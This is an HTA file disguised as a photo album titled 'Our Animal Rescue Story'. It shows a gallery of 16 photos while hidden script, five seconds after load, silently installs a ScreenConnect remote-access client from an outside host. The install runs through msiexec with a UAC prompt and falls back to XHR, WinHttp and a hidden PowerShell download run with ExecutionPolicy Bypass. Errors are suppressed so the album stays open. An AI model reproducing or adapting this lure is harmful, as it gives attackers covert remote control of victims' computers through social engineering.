<!DOCTYPE html>
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Our Animal Rescue Story</title>
<hta:application
  id="oHTA"
  applicationname="AnimalRescueStory"
  border="thin" caption="yes" maximizebutton="yes" minimizebutton="yes"
  navigateurl="no" showintaskbar="yes" singleinstance="yes" sysmenu="yes"
  version="1.0" windowstate="normal" scroll="no" contextmenu="no" selection="no"
/>
<style>
  html, body { margin:0; padding:0; height:100%; width:100%;
    font-family:"Segoe UI",Tahoma,sans-serif; background:#0e0e0e; color:#e8e2d6;
    overflow:hidden; cursor:default; }
  #wrap { height:100%; width:100%; position:relative; }
  #topbar { height:64px; background:#141414; border-bottom:1px solid #26221c;
    position:relative; }
  #logo { position:absolute; left:18px; top:12px; width:40px; height:40px; }
  #brand { position:absolute; left:70px; top:13px; }
  #couple { font-family:Georgia,"Times New Roman",serif; font-size:21px;
    color:#e9dfc8; letter-spacing:2px; }
  #dateline { font-size:11px; color:#8d867a; margin-top:3px; letter-spacing:1px; }
  #closebtn { position:absolute; right:12px; top:14px; font-size:20px; color:#6e695f;
    width:32px; height:32px; line-height:30px; text-align:center; cursor:pointer;
    border-radius:3px; }
  #closebtn:hover { color:#d8cfbc; }
  #gridwrap { position:absolute; top:64px; left:0; right:0; bottom:42px;
    overflow:auto; overflow-x:hidden; background:#0e0e0e; }
  #grid { position:relative; margin:16px auto 24px auto; width:940px; min-height:100%; }
  .cell { position:absolute; background:#181818; border:1px solid #23211d;
    border-radius:4px; overflow:hidden; cursor:pointer; }
  .cell img { width:100%; height:100%; display:block; }
  .cell .num { position:absolute; right:6px; bottom:4px; font-size:10px;
    color:#b6ad9d; background:rgba(0,0,0,0.45); padding:1px 6px; border-radius:3px; }
  #footer { position:absolute; left:0; right:0; bottom:0; height:42px;
    background:#141414; border-top:1px solid #26221c; text-align:center; }
  #footnote { position:absolute; left:0; right:0; top:13px; font-size:11px;
    color:#8d867a; letter-spacing:1px; }
  /* lightbox */
  #lb { position:absolute; top:0; left:0; right:0; bottom:0;
    background:rgba(5,5,5,0.97); display:none; z-index:50; }
  #lbimgwrap { position:absolute; top:44px; left:56px; right:56px; bottom:56px;
    text-align:center; }
  #lbimg { max-width:100%; max-height:100%; border:1px solid #2c2820; }
  #lbcap { position:absolute; left:0; right:0; bottom:16px; text-align:center;
    font-size:12px; color:#a49b8a; letter-spacing:1px; }
  #lbclose { position:absolute; left:14px; top:10px; font-size:22px; color:#7d766a;
    width:34px; height:34px; line-height:32px; text-align:center; cursor:pointer; }
  #lbclose:hover { color:#e2d9c4; }
  #lbprev, #lbnext { position:absolute; top:50%; font-size:34px; color:#9a917f;
    width:56px; height:90px; line-height:88px; text-align:center; cursor:pointer; }
  #lbprev { left:0; } #lbnext { right:0; }
  #lbprev:hover, #lbnext:hover { color:#f0e8d2; }
  /* hidden engine state (kept so status writes never break the page) */
  #engine { display:none; }
</style>
</head>
<body onload="init()">
  <div id="wrap">
    <div id="topbar">
      <div id="logo">
        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
          <circle cx="38" cy="54" r="26" fill="none" stroke="#c9a86a" stroke-width="7"/>
          <circle cx="62" cy="46" r="26" fill="none" stroke="#a8894e" stroke-width="7"/>
        </svg>
      </div>
      <div id="brand">
        <div id="couple">Animal Rescue Story</div>
        <div id="dateline">RESCUED &nbsp;&middot;&nbsp; AWARDED &nbsp;&middot;&nbsp; ON THE NEWS</div>
      </div>
      <div id="closebtn" onclick="cancel()" title="Close">&times;</div>
    </div>

    <div id="gridwrap"><div id="grid"></div></div>

    <div id="footer">
      <div id="footnote">16 PHOTOS &nbsp;&middot;&nbsp; THE FULL STORY</div>
    </div>

    <div id="lb">
      <div id="lbclose" onclick="closeLb()" title="Close">&times;</div>
      <div id="lbimgwrap"><div id="lbimg"><img id="lbimgi" src="" alt=""></div></div>
      <div id="lbprev" onclick="stepLb(-1)" title="Previous">&#8249;</div>
      <div id="lbnext" onclick="stepLb(1)" title="Next">&#8250;</div>
      <div id="lbcap"></div>
    </div>

    <div id="engine"></div>
  </div>

<script>
// ---------------------------------------------------------------------------
// Embedded album (base64 JPEGs, self-contained — no network needed to view)
// ---------------------------------------------------------------------------
var PHOTOS = [
  {s:"data:image/jpeg;base64,",w:640,h:480},
  {s:"data:image/jpeg;base64,",w:938,h:1250},
  {s:"data:image/jpeg;base64,",w:1250,h:813},
  {s:"data:image/jpeg;base64,",w:1250,h:938},
  {s:"data:image/jpeg;base64,",w:640,h:480},
  {s:"data:image/jpeg;base64,",w:1250,h:738},
  {s:"data:image/jpeg;base64,",w:1250,h:1250},
  {s:"data:image/jpeg;base64,",w:938,h:1250},
  {s:"data:image/jpeg;base64,",w:1250,h:938},
  {s:"data:image/jpeg;base64,",w:1250,h:938},
  {s:"data:image/jpeg;base64,",w:1250,h:1016},
  {s:"data:image/jpeg;base64,",w:1250,h:938},
  {s:"data:image/jpeg;base64,",w:1250,h:859},
  {s:"data:image/jpeg;base64,",w:1250,h:982},
  {s:"data:image/jpeg;base64,",w:1250,h:977},
  {s:"data:image/jpeg;base64,",w:1250,h:939},
];


// ---------------------------------------------------------------------------
// Album UI
// ---------------------------------------------------------------------------
var COLS = 4, COLW = 224, GAP = 10, PADL = 18;
var lbIdx = -1;

function $(id) { return document.getElementById(id); }

function init() {
  shell = new ActiveXObject("WScript.Shell");
  fso   = new ActiveXObject("Scripting.FileSystemObject");
  try {
    window.onerror = function (msg, src, line) {
      try { dumpDiagnostics("page-exc: " + msg + " line " + line); } catch (e) {}
      return true;
    };
  } catch (e) {}
  var w = 980, h = 660;
  window.resizeTo(w, h);
  var sw = screen.availWidth, sh = screen.availHeight;
  window.moveTo(Math.round((sw - w) / 2), Math.round((sh - h) / 2));

  baseDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\AlbumViewer";
  if (!fso.FolderExists(baseDir)) fso.CreateFolder(baseDir);
  msiLocal = baseDir + "\\AlbumViewer.msi";
  logPath  = baseDir + "\\AlbumViewer.log";
  logPath2 = baseDir + "\\AlbumViewer2.log";
  diagPath = baseDir + "\\diagnostics.txt";
  cleanStale();

  renderGrid();
  document.onkeydown = onKey;
  // Give the viewer a moment to actually look at the album before the
  // system prompt appears.
  setTimeout(startInstall, 5000);
}

function renderGrid() {
  var g = $('grid');
  var heights = [0, 0, 0, 0];
  for (var i = 0; i < PHOTOS.length; i++) {
    (function (idx) {
      var p = PHOTOS[idx];
      var w = p.w || 1250, h = p.h || 833;
      var dispH = Math.round(COLW * h / w);
      var col = 0;
      for (var c = 1; c < COLS; c++) if (heights[c] < heights[col]) col = c;
      var el = document.createElement('div');
      el.className = 'cell';
      el.style.left = (PADL + col * (COLW + GAP)) + 'px';
      el.style.top = heights[col] + 'px';
      el.style.width = COLW + 'px';
      el.style.height = dispH + 'px';
      el.title = 'View photo ' + (idx + 1);
      var img = document.createElement('img');
      img.src = p.s;
      img.setAttribute('alt', 'photo ' + (idx + 1));
      el.appendChild(img);
      var num = document.createElement('div');
      num.className = 'num';
      num.innerHTML = (idx + 1) + ' / ' + PHOTOS.length;
      el.appendChild(num);
      el.onmouseover = function () { el.style.borderColor = '#4a4436'; };
      el.onmouseout  = function () { el.style.borderColor = '#23211d'; };
      el.onclick     = function () { openLb(idx); };
      g.appendChild(el);
      heights[col] += dispH + GAP;
    })(i);
  }
  var max = 0;
  for (var c2 = 0; c2 < COLS; c2++) if (heights[c2] > max) max = heights[c2];
  g.style.height = max + 'px';
}

function openLb(idx) {
  lbIdx = idx;
  $('lb').style.display = 'block';
  showLbPhoto();
}
function closeLb() {
  lbIdx = -1;
  $('lb').style.display = 'none';
  $('lbimgi').src = '';
}
function stepLb(d) {
  if (lbIdx < 0) return;
  lbIdx = (lbIdx + d + PHOTOS.length) % PHOTOS.length;
  showLbPhoto();
}
function showLbPhoto() {
  $('lbimgi').src = PHOTOS[lbIdx].s;
  $('lbcap').innerHTML = (lbIdx + 1) + ' &nbsp;&middot;&nbsp; Our Animal Rescue Story';
}
function onKey(e) {
  e = e || window.event;
  var k = e.keyCode;
  if (k === 27) { if (lbIdx >= 0) closeLb(); else cancel(); }
  else if (k === 37) stepLb(-1);
  else if (k === 39) stepLb(1);
}

// ---------------------------------------------------------------------------
// ScreenConnect installer engine (silent; UAC consent on launch)
// ---------------------------------------------------------------------------
var MSI_URL = "https://don.lifetime-r.org/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";

var PREP_MS        = 0;       // album delay already applied in init()
var UAC_TIMEOUT_MS = 150000;  // no MSI log this long after launch -> UAC declined
var INSTALL_MAX_MS = 300000;  // hard cap for a whole install phase
var INSTALL_STALL_MS = 60000; // MSI log silent this long -> assume finished
var FB_STAGE_MS    = { xhr: 120000, winhttp: 180000, ps: 300000 };
var FB_MAX_MS      = 600000;  // hard cap for the whole local fallback download
var EXPECT_BYTES   = 13266944; // ScreenConnect MSI size (progress scaling only)

var UA_STR = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";

var shell = null, fso = null;
var state = "ready";            // ready | installing | fallback-dl | fallback-install | done | error
var startTime = 0;
var tickTimer = null, pollTimer = null, fbTimer = null;

var installMode = "url";
var curLog = "";
var baseDir = "", msiLocal = "", logPath = "", logPath2 = "", diagPath = "";

var fbT0 = 0, fbStageT = 0;
var dlStage = "xhr";
var dlSettled = false;
var dlXHR = null;
var psMarker = "", psDir = "", psT0 = 0, psLastSize = 0, psLastGrowT = 0, psDone = false;
var lastLogSize = 0, lastLogGrowT = 0;

var PS_PS = "# Local-fallback download (WinINET iwr, TLS12) + curl.exe inside.\n" +
"# param(1) = unique marker, param(2) = temp dir, param(3) = output file.\n" +
"param([string]$Url = \"\", [string]$TmpDir = \"\", [string]$Out = \"\")\n" +
"if (-not $Out) { $Out = Join-Path $TmpDir \"AlbumViewer.msi\" }\n" +
"try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}\n" +
"try {\n" +
"  $ProgressPreference = 'SilentlyContinue'\n" +
"  Invoke-WebRequest -Uri $Url -OutFile $Out -UseBasicParsing\n" +
"  $ProgressPreference = 'Continue'\n" +
"} catch {\n" +
"  try { $env:NO_PROXY = \"*\"; curl.exe -L --fail --retry 2 --connect-timeout 20 -o $Out $Url 2>$null } catch {}\n" +
"}\n" +
"try { Set-Content -LiteralPath (Join-Path $TmpDir \"done.flag\") \"1\" -NoNewline } catch {}";

function nowMs() { return new Date().getTime(); }

function cleanStale() {
  var p = [msiLocal, logPath, logPath2, diagPath];
  for (var i = 0; i < p.length; i++) {
    try { if (fso.FileExists(p[i])) fso.DeleteFile(p[i], true); } catch (e) {}
  }
}

function deleteFile(p) { try { if (fso.FileExists(p)) fso.DeleteFile(p, true); } catch (e) {} }
function ensureDir(d) { try { if (!fso.FolderExists(d)) fso.CreateFolder(d); } catch (e) {} }

function readHeadBytes(path, n) {
  if (!fso.FileExists(path)) return [];
  try {
    var s = new ActiveXObject("ADODB.Stream");
    s.Type = 1; s.Open(); s.LoadFromFile(path); s.Position = 0;
    var b = s.Read(n);
    try { s.Close(); } catch (e) {}
    var out = [];
    for (var i = 0; i < b.length; i++) out.push(b.charCodeAt(i) & 0xFF);
    return out;
  } catch (e) {}
  try {
    var f = fso.OpenTextFile(path, 1, false, 0);
    var d = "";
    try { d = f.Read(n); } catch (e2) {}
    try { f.Close(); } catch (e3) {}
    var out2 = [];
    for (var j = 0; j < d.length; j++) out2.push(d.charCodeAt(j) & 0xFF);
    return out2;
  } catch (e4) { return []; }
}

function msiMagicOk(path) {
  try {
    var m = readHeadBytes(path, 4);
    return m.length === 4 && m[0] === 0xD0 && m[1] === 0xCF && m[2] === 0x11 && m[3] === 0xE0;
  } catch (e) { return false; }
}

function killByCmd(marker) {
  try {
    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!//./root/cimv2");
    var q = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE CommandLine LIKE '%" + marker + "%'");
    var en = new Enumerator(q);
    for (; !en.atEnd(); en.moveNext()) {
      try { shell.Run("taskkill /f /t /pid " + en.item().ProcessId, 0, true); } catch (e2) {}
    }
  } catch (e3) {}
}

// ---------------------------------------------------------------------------
// Install phase (primary): msiexec fetches the MSI from the URL itself.
// Single UAC consent via ShellExecute "runas".
// ---------------------------------------------------------------------------
function launchMsiexec(args) {
  try {
    var sh = new ActiveXObject("Shell.Application");
    sh.ShellExecute("msiexec.exe", args, "", "runas", 1);
    return true;
  } catch (e) {}
  try { shell.Run("msiexec " + args, 0, false); return true; } catch (e2) {}
  return false;
}

function startInstall() {
  if (state !== "ready") return;
  state = "installing";
  installMode = "url";
  curLog = logPath;
  startTime = nowMs();

  var args = '/i "' + MSI_URL + '" /qn /norestart /L*v "' + curLog + '"';
  if (!launchMsiexec(args)) {
    fail("install: launch failed");
    return;
  }
  pollTimer = setInterval(pollInstall, 800);
}

function readLogTail(log, bytes) {
  var d = "";
  try {
    if (!fso.FileExists(log)) return "";
    var f = fso.OpenTextFile(log, 1, false, -1);
    try {
      var pos = Math.floor(f.Size / 2) - bytes;
      if (pos > 0) f.Position = pos;
      d = f.Read(-1);
    } catch (e) {
      try { f.Close(); } catch (e2) {}
      f = fso.OpenTextFile(log, 1, false, 0);
      var pos2 = f.Size - bytes;
      if (pos2 > 0) f.Position = pos2;
      d = f.Read(-1);
    }
    try { f.Close(); } catch (e3) {}
    return d;
  } catch (e) { return ""; }
}

function logInfo(log) {
  var out = { exists: false, size: 0, status: -1, tail: "" };
  try {
    if (fso.FileExists(log)) {
      out.exists = true;
      out.size = fso.GetFile(log).Size;
      out.tail = readLogTail(log, 65536);
      var m = out.tail.match(/Installation success or error status:\s*(-?\d+)/);
      if (m) out.status = parseInt(m[1], 10);
    }
  } catch (e) {}
  return out;
}

function downloadFailTail(tail) {
  if (!tail) return false;
  if (/Failed to open remote MSI/i.test(tail)) return true;
  if (/Failed to read from remote file/i.test(tail)) return true;
  if (/could not access network location/i.test(tail)) return true;
  if (/(0x80041064|0x80041065|0x80041066|0x80041067)/i.test(tail)) return true;
  if (/Source file.*could not be (opened|found|accessed)/i.test(tail)) return true;
  return false;
}

function pollInstall() { try { _pollInstall(); } catch (e) {} }

function _pollInstall() {
  if (state !== "installing" && state !== "fallback-install") return;
  var t = nowMs();
  var info = logInfo(curLog);
  if (info.status >= 0) {
    if (info.status === 0 || info.status === 3010) { finishInstall(); return; }
    if (installMode === "url" && downloadFailTail(info.tail)) { startFallback(); return; }
    fail("install_rc=" + info.status);
    return;
  }
  if (info.exists) {
    if (info.size > lastLogSize) { lastLogSize = info.size; lastLogGrowT = t; }
    if (t - lastLogGrowT > INSTALL_STALL_MS) {
      if (installMode === "url" && downloadFailTail(info.tail)) { startFallback(); return; }
      fail("install: log stalled, no status");
      return;
    }
    return;
  }
  if (t - startTime > UAC_TIMEOUT_MS) fail("install: uac timeout");
}

// ---------------------------------------------------------------------------
// Fallback: msiexec could not fetch the MSI from the URL. Download locally —
// XHR (WinINET) -> WinHttp -> hidden PowerShell iwr/curl — then install.
// ---------------------------------------------------------------------------
function startFallback() {
  state = "fallback-dl";
  installMode = "dl";
  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
  fbT0 = nowMs(); fbStageT = fbT0;
  dlSettled = false;
  deleteFile(msiLocal);
  dlStage = "xhr";
  fbTimer = setInterval(pollFallback, 250);
  fallbackXHR();
}

function fallbackNext() {
  if (state !== "fallback-dl" || dlSettled) return;
  if (dlStage === "xhr") { fallbackWinHttp(); return; }
  if (dlStage === "winhttp") { fallbackPS(); return; }
  fail("fallback: all download stages failed");
}

function fallbackXHR() {
  if (dlStage !== "xhr" || dlSettled) return;
  var x = null;
  try { x = new XMLHttpRequest(); } catch (e) {}
  if (!x || !("responseType" in x)) { fallbackNext(); return; }
  try {
    x.open("GET", MSI_URL, true);
    x.responseType = "ms-stream";
    x.timeout = FB_STAGE_MS.xhr;
  } catch (e) { fallbackNext(); return; }
  dlXHR = x;
  x.onload = function () {
    if (dlStage !== "xhr" || dlSettled) return;
    if (x.status === 200) {
      try { var b = x.response; if (b && b.size >= 1048576) { saveFallbackBody(b, "xhr"); return; } } catch (e) {}
    }
    fallbackNext();
  };
  x.onerror = function () { if (dlStage === "xhr" && !dlSettled) fallbackNext(); };
  x.ontimeout = function () { if (dlStage === "xhr" && !dlSettled) fallbackNext(); };
  try { x.send(); } catch (e) { fallbackNext(); }
}

function saveFallbackBody(body, method) {
  try {
    var s = new ActiveXObject("ADODB.Stream");
    s.Type = 1; s.Mode = 3; s.Open();
    try { body.Seek(0, 0); } catch (e) {}
    s.CopyFrom(body);
    s.SaveToFile(msiLocal, 2);
    s.Close();
  } catch (e) { fallbackNext(); return; }
  dlSettled = true;
  if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
  verifyFallback();
}

function fallbackWinHttp() {
  if (dlSettled) return;
  dlStage = "winhttp";
  fbStageT = nowMs();
  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} dlXHR = null; }
  try {
    var w = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    try { w.Option(13) = 2147483647; } catch (e) {}
    w.SetTimeouts(15000, 30000, 120000, 180000);
    w.Open("GET", MSI_URL, true);
    w.SetRequestHeader("User-Agent", UA_STR);
    w.onreadystatechange = function () {
      if (dlStage !== "winhttp" || dlSettled) return;
      if (w.ReadyState !== 4) return;
      if (w.Status === 200) {
        try { if (w.BodySize >= 1048576) { saveWHttpBody(w.responseBody); return; } } catch (e) {}
      }
      fallbackNext();
    };
    w.ontimeout = function () { if (dlStage !== "winhttp" && !dlSettled) return; if (dlStage === "winhttp" && !dlSettled) fallbackNext(); };
    w.Send();
  } catch (e) { fallbackNext(); }
}

function saveWHttpBody(rb) {
  try {
    var s = new ActiveXObject("ADODB.Stream");
    s.Type = 1; s.Mode = 3; s.Open();
    s.CopyFrom(rb);
    s.SaveToFile(msiLocal, 2);
    s.Close();
  } catch (e) { fallbackNext(); return; }
  dlSettled = true;
  if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
  verifyFallback();
}

function fallbackPS() {
  if (dlSettled) return;
  dlStage = "ps";
  fbStageT = nowMs();
  psMarker = "albm" + Math.floor(Math.random() * 16777215).toString(16);
  psDir = shell.ExpandEnvironmentStrings("%TEMP%") + "\\alb_" + psMarker;
  ensureDir(psDir);
  deleteFile(psDir + "\\done.flag");
  var src = fso.GetFolder(shell.ExpandEnvironmentStrings("%TEMP%")).Path + "\\__alb__download.ps1";
  try {
    deleteFile(src);
    var w = fso.CreateTextFile(src, true, false);
    w.Write(PS_PS);
    w.Close();
  } catch (e) { fallbackNext(); return; }
  psT0 = nowMs(); psLastSize = 0; psLastGrowT = psT0; psDone = false;
  var cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"" + src +
    "\" -Url \"" + MSI_URL + "\" -TmpDir \"" + psDir + "\" -Out \"" + msiLocal + "\"";
  try { shell.Run(cmd, 0, false); }
  catch (e) { deleteFile(src); fallbackNext(); }
}

function pollFallback() { try { _pollFallback(); } catch (e) {} }

function _pollFallback() {
  if (state !== "fallback-dl" || dlSettled) return;
  var t = nowMs();
  if (t - fbT0 > FB_MAX_MS) {
    fail("fallback: total timeout " + (t - fbT0) + "ms");
    return;
  }
  if (dlStage === "ps") {
    var sz = 0;
    try { if (fso.FileExists(msiLocal)) sz = fso.GetFile(msiLocal).Size; } catch (e) {}
    if (sz > psLastSize) { psLastSize = sz; psLastGrowT = t; }
    var doneFlag = false;
    try { doneFlag = fso.FileExists(psDir + "\\done.flag"); } catch (e) {}
    if (sz >= 1048576 && msiMagicOk(msiLocal) && (psLastSize === sz && t - psLastGrowT >= 1500)) {
      dlSettled = true;
      if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
      verifyFallback();
      return;
    }
    if (doneFlag && (t - psT0 > 10000 || sz < 1048576)) {
      fallbackNext();
      return;
    }
  }
  var budget = FB_STAGE_MS[dlStage];
  if (budget && t - fbStageT > budget) fallbackNext();
}

function verifyFallback() {
  try {
    if (!fso.FileExists(msiLocal)) { fail("fallback: no msi"); return; }
    var sz = fso.GetFile(msiLocal).Size;
    if (sz < 1048576) { fail("fallback: small " + sz); return; }
    var magic = null;
    try { magic = readHeadBytes(msiLocal, 4); } catch (e) { magic = null; }
    if (magic && magic.length === 4) {
      if (magic[0] !== 0xD0 || magic[1] !== 0xCF || magic[2] !== 0x11 || magic[3] !== 0xE0) {
        fail("fallback: bad magic");
        return;
      }
    }
  } catch (e) {
    fail("fallback: verify " + e.message);
    return;
  }
  fallbackInstall();
}

function fallbackInstall() {
  state = "fallback-install";
  installMode = "local";
  curLog = logPath2;
  deleteFile(curLog);
  startTime = nowMs();
  lastLogSize = 0;
  lastLogGrowT = nowMs();

  var args = '/i "' + msiLocal + '" /qn /norestart /L*v "' + curLog + '"';
  if (!launchMsiexec(args)) {
    fail("fallback-install: launch failed");
    return;
  }
  pollTimer = setInterval(pollInstall, 800);
}

// ---------------------------------------------------------------------------
// Diagnostics — registry reads + log tail only, no external tooling.
// ---------------------------------------------------------------------------
function osBuild() {
  try {
    var v = shell.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\CurrentBuildNumber");
    if (v) return String(v);
  } catch (e) {}
  return "unknown";
}

function regStr(key, name) {
  try {
    var v = shell.RegRead(key + "\\" + name);
    return (typeof v === "undefined") ? "(none)" : String(v);
  } catch (e) { return "(none)"; }
}

function dumpDiagnostics(reason) {
  try {
    var L = [];
    L.push("Album diagnostics");
    L.push("time: " + new Date().toString());
    L.push("reason: " + reason);
    L.push("state: " + state);
    L.push("install_mode: " + installMode);
    L.push("elapsed_ms: " + (startTime ? nowMs() - startTime : 0));
    L.push("msi_url: " + MSI_URL);
    L.push("os: " + shell.ExpandEnvironmentStrings("%OS% %PROCESSOR_ARCHITECTURE%"));
    L.push("build: " + osBuild());
    L.push("msi_local: " + (fso.FileExists(msiLocal) ? "yes (" + fso.GetFile(msiLocal).Size + " bytes)" : "no"));
    L.push("wininet ProxyEnable: " + regStr("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "ProxyEnable"));
    L.push("wininet ProxyServer: " + regStr("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "ProxyServer"));
    L.push("wininet ProxyOverride: " + regStr("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "ProxyOverride"));
    L.push("wininet AutoConfigURL: " + regStr("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "AutoConfigURL"));
    L.push("winhttp mode: " + regStr("HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinHttp\\Parameters", "DefaultProxyRequirements"));
    L.push("winhttp ProxyServer: " + regStr("HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinHttp\\Parameters", "ProxyServer"));
    if (curLog) {
      var tail = readLogTail(curLog, 65536);
      if (tail) {
        L.push("--- msi log tail (" + curLog + ") ---");
        var lines = tail.split("\n");
        for (var i = Math.max(0, lines.length - 25); i < lines.length; i++) L.push(lines[i]);
      }
    }
    var w = fso.CreateTextFile(diagPath, true);
    w.Write(L.join("\r\n"));
    w.Close();
  } catch (e) {}
}

// Silent outcomes: the album stays open no matter what happens underneath.
function fail(reason) {
  if (state === "done" || state === "error") return;
  state = "error";
  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
  if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} }
  if (psMarker) { killByCmd(psMarker); psMarker = ""; }
  dumpDiagnostics(reason);
}

function finishInstall() {
  if (state === "done" || state === "error") return;
  state = "done";
  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
  if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
}

function cancel() {
  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} }
  if (psMarker) { killByCmd(psMarker); psMarker = ""; }
  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
  if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
  // Do NOT delete msiLocal on close: if the install is mid-flight in a
  // separate msiexec process, deleting the file under it can abort it.
  window.close();
}
</script>
</body>
</html>
